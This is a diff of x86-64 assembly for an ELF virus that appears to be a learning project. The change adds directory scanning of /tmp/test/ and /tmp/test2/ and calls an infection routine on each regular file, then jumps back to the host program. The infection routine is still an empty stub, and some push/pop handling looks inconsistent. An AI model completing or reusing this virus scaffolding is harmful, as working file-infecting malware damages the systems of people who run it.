@@ -1,6 +1,10 @@
 global _start
+section .text
 
-%define STUB_SIZE (_end - _start)
+%define data(x)       [(rsp - data_size) + data.%+x]
+
+STUB_SIZE:      equ (_end - _start)
+DIRENT_ARR_SIZE:    equ 1024
 
 ; syscalls
 SYS_READ:       equ 0
@@ -11,11 +15,13 @@ SYS_LSEEK:      equ 8
 SYS_MMAP:       equ 9
 SYS_MPROTECT:   equ 10
 SYS_EXIT:       equ 60
+SYS_GETDENTS:   equ 78
 
 ; open flags
-O_RDONLY:   equ 0
-O_WRONLY:   equ 1
-O_RDWR:     equ 2
+O_RDONLY:       equ 0
+O_WRONLY:       equ 1
+O_RDWR:         equ 2
+O_DIRECTORY:    equ 65536
 
 ; mmap flags
 MAP_SHARED:     equ 0x01
@@ -58,6 +64,25 @@ ET_DYN:     equ 3
 ET_CORE:    equ 4
 ET_NUM:     equ 5
 
+struc	stat
+    .st_dev			resq	1	; ID of device containing file
+    .__pad1			resw	1	; Padding
+    .st_ino			resq	1	; Inode number
+    .st_mode		resd	1	; File type and mode
+    .st_nlink		resq	1	; Number of hard links
+    .st_uid			resd	1	; User ID of owner
+    .st_gid			resd	1	; Group ID of owner
+    .st_rdev		resq	1	; Device ID (if special file)
+    .__pad2			resw	1	; Padding
+    .st_size		resq	1	; Total size, in bytes
+    .st_blksize		resq	1	; Block size for filesystem I/O
+    .st_blocks		resq	1	; Number of 512B blocks allocated
+    .st_atim		resq	2	; Time of last access
+    .st_mtim		resq	2	; Time of last modification
+    .st_ctim		resq	2	; Time of last status change
+    .__unused		resq	3	; Unused
+endstruc
+
 struc Elf64_Ehdr
     .e_ident        resb EI_NIDENT
     .e_type         resw 1
@@ -88,138 +113,111 @@ struc Elf64_Shdr
     .sh_entsize     resq 1
 endstruc
 
+; dirent
+; d_type
+DT_REG: equ 8
+
+struc	dirent
+    .d_ino:			resq	1
+    .d_off:			resq	1
+    .d_reclen		resw	1
+    ; char d_name[] - flexible array member, size can
+    ; be calculated from d_reclen
+    .d_name			resb	1
+    ; pad
+    ; d_type (dirent + d_reclen - 1)
+endstruc
+
+struc data
+    .base_address   resq 1
+    .dirent_array   resb DIRENT_ARR_SIZE
+    .dir_fd         resq 1
+endstruc
+
 _start:
-    call get_base_address
+    push rdi
+    push rsi
+    push rcx
+    push rdx
+
+    push rbp
+    mov rbp, rsp
+    ; NASM automatically creates a <name>_size constant for strucs
+    sub rbp, data_size
+
+    lea rax, [rel _start]
+    mov rdx, [rel virus_entry]
+    sub rax, rdx
+    add rax, [rel host_entry]
     push rax
 
-    lea rdi, [rel file_path]
-    call try_infect
+    ; call get_base_address
+    ; mov data(base_address), rax
 
-    mov rax, SYS_CLOSE
-    mov rdi, r8
-    syscall
-
-    mov rax, SYS_EXIT
-    mov rdi, 0
-    syscall
-
-; rdi: file_path
-try_infect:
-    open_file:
+    lea r15, [rel infect_directories]
+    .open_directory:
+        mov rdi, [r15]
+        test rdi, rdi
+        jz _host
+        mov rax, SYS_WRITE
+        lea rsi, [rel directory_msg]
+        mov rdi, 1
+        mov rdx, 4
+        syscall
+        mov rsi, O_DIRECTORY | O_RDONLY
         mov rax, SYS_OPEN
-        mov rsi, O_RDONLY
         syscall
-        cmp eax, 0
-        jl error
-    ; open_file
-
-    mov r8, rax
-    sub rsp, 16
-
-    read_e_ident:
-        mov rax, SYS_READ
-        mov rdi, r8
-        lea rsi, [rsp]
-        mov rdx, 16
+        test rax, rax
+        jl .next_directory
+        mov data(dir_fd), rax
+    .read_directory:
+        mov rdx, DIRENT_ARR_SIZE
+        lea rsi, data(dirent_array)
+        mov rdi, data(dir_fd)
+        mov rax, SYS_GETDENTS
         syscall
-        cmp eax, 0
-        jl error
-
-    lea rdi, [rsp]
-    elf64_ident_check:
-        mov eax, DWORD [rdi]
-        cmp eax, (ELFMAG3 << 24) | (ELFMAG2 << 16) | (ELFMAG1 << 8) | (ELFMAG0)
-        jne not_elf
-
-        cmp BYTE [rdi + EI_CLASS], ELFCLASS64
-        jne not_64_bit
-        cmp BYTE [rdi + EI_DATA], ELFDATANONE
-        je not_elf
-        cmp BYTE [rdi + EI_VERSION], EV_CURRENT
-        jne not_elf
-
-        mov rcx, 7
-        lea rsi, [rdi + EI_PAD]
-        check_padding:
-            cmp BYTE [rsi], 0
-            jne not_elf
-            inc rsi
-            loop check_padding
-        ; check_padding
-    ; elf64_ident_check
-
-    ; in: fd (r8)
-    ; out: len (rax)
-    get_file_len:
-        mov rax, SYS_LSEEK
-        mov rdi, r8
-        mov rsi, 0
-        mov rdx, SEEK_END
+        test rax, rax
+        jle .close_directory
+        xor r13, r13 ; offset counter for directory entries
+        mov r12, rax ; number of bytes read by getdents
+    .process_file:
+        lea rdi, data(dirent_array)
+        add rdi, r13
+        ; d_type is the last field in the dirent struct, which has 
+        ; a variable length due to the d_name field
+        movzx edx, WORD [rdi + dirent.d_reclen]
+        mov al, BYTE [rdi + rdx - 1]
+        ; store address of file currently being processed
+        add rdi, dirent.d_name
+        add r13, rdx
+        cmp al, DT_REG
+        jne .next_file
+        call do_infect
+    .next_file:
+        cmp r13, r12
+        jl .process_file
+        jmp .read_directory
+    .close_directory:
+        mov rdi, data(dir_fd)
+        mov rax, SYS_CLOSE
         syscall
-    ; get_file_len
+    .next_directory:
+        add r15, 8
+        jnz .open_directory
 
-    ; in: fd (r8), len (rax)
-    ; out: addr (rax)
-    map_file:
-        mov rsi, rax ; len
-        mov rdi, 0 ; addr
-        mov rax, SYS_MMAP
-        mov rdx, PROT_READ | PROT_WRITE
-        mov r10, MAP_PRIVATE
-        mov r9, 0 ; pgoff
-        syscall
-    ; map_file
+    add rsp, data_size
+    pop rbp
 
-    ; in: mapped_file (rax)
-    ; out: 1/0 (rax)
-    has_signature:
-        mov rcx, rsi ; len
-        lea rsi, [rel signature]
-        lea rax, [rax]
-        xor r8, r8
-        haystack_loop:
-            cmp r8, rcx
-            jae not_found
-            xor r9, r9
-            needle_loop:
-                cmp BYTE [rsi + r9], 0
-                je found
+    pop rax
+    pop rbp
+    pop rdx
+    pop rcx
+    pop rdi
+    pop rdi
+    jmp rax
 
-                mov r10, r8
-                add r10, r9
-                cmp r10, rcx
-                jae not_found
-
-                mov dl, BYTE [rsi + r9]
-                cmp dl, BYTE [rax + r10]
-                jne mov_haystack_ptr
-
-                inc r9
-                jmp needle_loop
-            ; needle_loop
-            mov_haystack_ptr:
-                inc r8
-                jmp haystack_loop
-
-            ; haystack_loop
-        not_found:
-            mov rax, 0
-            jmp eval
-        ; not_found
-        found:
-            mov rax, 1
-        ; found
-    ; has_signature
-
-    eval:
-        cmp rax, 0
-        je do_infect
-        cmp rax, 1
-        je signature_found_exit
-
-    add sp, 16
-    ret
-; is_infectable
+do_infect:
+    jmp exit
 
 ; in: -
 ; out: base_address (rax)
@@ -229,11 +227,11 @@ get_base_address:
     mov rax, SYS_OPEN
     syscall
     cmp eax, 0
-    jl error
+    jl exit
 
     push rax
 
-    sub sp, 16
+    sub rsp, 16
 
     xor r10, r10
     xor r8, r8
@@ -249,7 +247,7 @@ get_base_address:
         syscall
 
         cmp eax, 1
-        jl error
+        jl exit
 
         cmp BYTE [rsp], '-'
         je break
@@ -275,67 +273,73 @@ get_base_address:
     ; load
     break:
         sub sp, r10w
-        add sp, 16
+        add rsp, 16
 
         pop rdi
         mov rax, SYS_CLOSE
         syscall
         cmp eax, 0
-        jl error
+        jl exit
     ; break
     mov rax, rbx
     ret
 ; get_base_address
 
-error:
+; error:
+;     mov rax, SYS_EXIT
+;     mov rdi, 1
+;     syscall
+; ; error
+
+exit:
     mov rax, SYS_EXIT
-    mov rdi, 1
+    xor rdi, rdi
     syscall
-; error
+; exit
 
-success:
-    mov rax, SYS_EXIT
-    mov rdi, 0
-    syscall
-; success
+; not_elf:
+;     add rsp, 16
+;     mov rax, SYS_WRITE
+;     mov rdi, 1
+;     lea rsi, [rel not_elf_msg]
+;     mov rdx, 11
+;     syscall
 
-not_elf:
-    add rsp, 16
-    mov rax, SYS_WRITE
-    mov rdi, 1
-    lea rsi, [rel not_elf_msg]
-    mov rdx, 11
-    syscall
+;     jmp exit
+; ; not_elf
 
-    jmp success
-; not_elf
+; not_64_bit:
+;     add rsp, 16
+;     mov rax, SYS_WRITE
+;     mov rdi, 1
+;     lea rsi, [rel not_64_bit_msg]
+;     mov rdx, 17
+;     syscall
 
-not_64_bit:
-    add rsp, 16
-    mov rax, SYS_WRITE
-    mov rdi, 1
-    lea rsi, [rel not_64_bit_msg]
-    mov rdx, 17
-    syscall
+;     jmp exit
+; ; not_64_bit
 
-    jmp success
-; not_64_bit
+; signature_found_exit:
+;     jmp exit
+; ; signature_found
 
-signature_found_exit:
-    jmp success
-; signature_found
+; do_infect:
+;     add rsp, 16
+;     mov rax, SYS_WRITE
+;     mov rdi, 1
+;     lea rsi, [rel do_infect_msg]
+;     mov rdx, 7
+;     syscall
 
-do_infect:
-    add rsp, 16
-    mov rax, SYS_WRITE
-    mov rdi, 1
-    lea rsi, [rel do_infect_msg]
-    mov rdx, 7
-    syscall
+;     jmp exit
+; ; signature_found
 
-    jmp success
-; signature_found
-
+infect_directories:
+    dq tmp_test, tmp_test2, 0
+tmp_test:
+    db "/tmp/test/", 0
+tmp_test2:
+    db "/tmp/test2/", 0
 proc_self_exe:
     db "/proc/self/exe", 0
 proc_self_maps:
@@ -350,4 +354,28 @@ signature:
     db "abied-ch:ef082ac137069c1ef08f0a6d54ea4d2f4e180fb2769b9bb9f137cc5f98f5f4fe", 0
 do_infect_msg:
     db "INFECT", 10
+virus_entry:
+    dq _start
+host_entry:
+    dq _host
+directory_msg:
+    db "dir", 10
+host_msg:
+    db "host", 10
 _end:
+
+_host:
+    push rax
+    push rdi
+    push rsi
+    push rdx
+    mov rax, SYS_WRITE
+    mov rdi, 1
+    lea rsi, [rel host_msg]
+    mov rdx, 5
+    syscall
+    pop rdx
+    pop rsi
+    pop rdi
+    pop rax
+    jmp exit
